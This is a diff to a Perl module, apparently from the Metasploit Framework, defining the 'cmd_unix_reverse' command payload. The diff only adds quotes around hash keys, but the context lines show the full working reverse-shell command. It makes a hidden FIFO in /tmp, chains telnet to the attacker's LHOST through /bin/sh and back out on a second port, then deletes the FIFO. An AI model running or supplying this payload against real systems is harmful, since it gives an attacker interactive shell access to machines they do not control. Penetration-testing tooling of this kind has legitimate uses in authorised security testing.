@@ -4,18 +4,18 @@ use base 'Msf::CommandPayload';
 
 my $info =
 {
-    Name         => 'cmd_unix_reverse',
-    Version      => '1.0',
-    Description  => 'Use telnet|sh|telnet to simulate reverse shell',
-    Author       => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
-    Arch         => [  ],
-    Priv         => 0,
-    OS           => [ 'solaris', 'linux', 'bsd' ],
-    Keys         => ['cmd'], 
-    Multistage   => 0,
-    Type         => 'reverse_shell_split',
-    Size         => '',
-    UserOpts     =>
+    'Name'         => 'cmd_unix_reverse',
+    'Version'      => '1.0',
+    'Description'  => 'Use telnet|sh|telnet to simulate reverse shell',
+    'Author'       => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
+    'Arch'         => [  ],
+    'Priv'         => 0,
+    'OS'           => [ 'solaris', 'linux', 'bsd' ],
+    'Keys'         => ['cmd'], 
+    'Multistage'   => 0,
+    'Type'         => 'reverse_shell_split',
+    'Size'         => '',
+    'UserOpts'     =>
         {
             'LHOST'  => [1, 'ADDR', 'Address of the attacking system'],
             'LPORTA' => [1, 'PORT', 'Listening port for shell input'],
@@ -27,7 +27,7 @@ my $info =
     # environement. By piping the output of the second command into the
     # fifo, we can cause the whole sequence to exit cleanly
             
-    CommandPayload =>
+    'CommandPayload' =>
     "mknod /tmp/.msfin p;cat /tmp/.msfin|".
     "telnet [>LHOST<] [>LPORTA<]|/bin/sh 2>&1|telnet [>LHOST<] [>LPORTB<] >/tmp/.msfin 2>&1;".
     "rm -f /tmp/.msfin",
